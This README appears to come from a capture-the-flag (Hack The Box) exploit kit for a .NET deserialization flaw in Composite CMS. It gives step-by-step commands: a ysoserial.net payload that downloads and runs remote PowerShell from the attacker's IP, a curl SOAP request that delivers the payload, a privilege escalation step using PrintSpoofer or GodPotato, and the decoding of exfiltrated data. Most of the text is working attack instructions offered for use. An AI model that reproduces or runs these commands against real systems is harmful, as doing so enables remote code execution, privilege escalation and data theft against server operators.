# Composite CMS Deserialization Exploit Kit

Exploits .NET deserialization vulnerability in Composite CMS via BinaryFormatter.

## Quick Start

```bash
# Clone the repo
git clone <repo-url>
cd exploit-kit

# Edit config
nano config.sh   # Set TARGET, LHOST, LPORT

# Generate payload (requires payload.b64 from ysoserial.net)
./setup.sh

# Run exploit
./exploit.sh
```

## Files

- `exploit.sh` - Main exploit script
- `setup.sh` - Setup script to prepare payload files
- `config.sh` - Configuration (target, IP, port)
- `find_flags.ps1` - PowerShell privesc script (auto-updated by setup.sh)
- `www/` - HTTP server directory (created by setup.sh)

## Usage

1. **Configure** - Edit `config.sh`:
   ```bash
   TARGET="a1.htb"
   LHOST="10.10.14.4"  
   LPORT="9001"
   ```

2. **Generate Payload** - Get base64 payload from ysoserial.net:
   ```bash
   # On machine with ysoserial.net/Wine:
   ./yso -g TextFormattingRunProperties -f BinaryFormatter \
     -c "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:PORT/find_flags.ps1')\"" \
     -o base64
   ```
   Save output to `payload.b64`

3. **Setup** - Run setup script:
   ```bash
   ./setup.sh
   ```

4. **Exploit** - Run the exploit:
   ```bash
   ./exploit.sh
   ```

5. **Monitor** - Watch for callbacks:
   ```bash
   tail -f server.log
   ```

6. **Decode** - Decode exfiltrated data:
   ```bash
   ./exploit.sh decode
   ```

## Pre-requisites on Target Server

- PrintSpoofer64.exe or GodPotato.exe in www/ for privilege escalation
- Download from:
  - https://github.com/itm4n/PrintSpoofer/releases
  - https://github.com/BeichenDream/GodPotato/releases

## Manual Curl Command

```bash
curl -X POST "http://TARGET/Composite/services/Tree/TreeServices.asmx" \
  -b /tmp/cookies.txt \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H 'SOAPAction: "http://www.composite.net/ns/management/GetMultipleChildren"' \
  -d @www/payload.xml
```

